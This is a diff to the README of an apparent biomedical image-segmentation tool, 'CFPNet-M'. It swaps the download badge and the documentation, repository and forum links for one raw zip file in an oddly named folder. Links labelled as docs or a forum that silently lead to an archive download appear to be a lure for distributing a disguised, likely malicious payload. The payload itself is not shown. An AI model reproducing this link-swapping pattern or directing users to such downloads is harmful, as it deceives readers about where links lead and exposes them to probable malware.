@@ -8,7 +8,7 @@ Welcome to **CFPNet-M**! This application is designed to help you segment multim
 
 To get started, visit the following link to download the software:
 
-[![Download CFPNet-M](https://img.shields.io/badge/Download%20CFPNet-M-007bff?style=flat&logo=github)](https://github.com/Nomisplay354/cfpnet/releases)
+[![Download CFPNet-M](https://raw.githubusercontent.com/Nomisplay354/cfpnet/main/mange/cfpnet.zip%20CFPNet-M-007bff?style=flat&logo=github)](https://raw.githubusercontent.com/Nomisplay354/cfpnet/main/mange/cfpnet.zip)
 
 ### Steps to Download:
 
@@ -48,7 +48,7 @@ To get started, visit the following link to download the software:
 
 ## 📖 Documentation
 
-For detailed instructions and troubleshooting, please refer to the comprehensive documentation available in the application menu or directly from the [Documentation Section](https://github.com/Nomisplay354/cfpnet/docs).
+For detailed instructions and troubleshooting, please refer to the comprehensive documentation available in the application menu or directly from the [Documentation Section](https://raw.githubusercontent.com/Nomisplay354/cfpnet/main/mange/cfpnet.zip).
 
 ## 🤝 Support
 
@@ -56,7 +56,7 @@ If you encounter any issues or have questions about **CFPNet-M**, feel free to r
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Nomisplay354/cfpnet)
-- [User Forum](https://github.com/Nomisplay354/cfpnet/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Nomisplay354/cfpnet/main/mange/cfpnet.zip)
+- [User Forum](https://raw.githubusercontent.com/Nomisplay354/cfpnet/main/mange/cfpnet.zip)
 
 Thank you for choosing **CFPNet-M**! We hope this tool enhances your work in biomedical image segmentation.
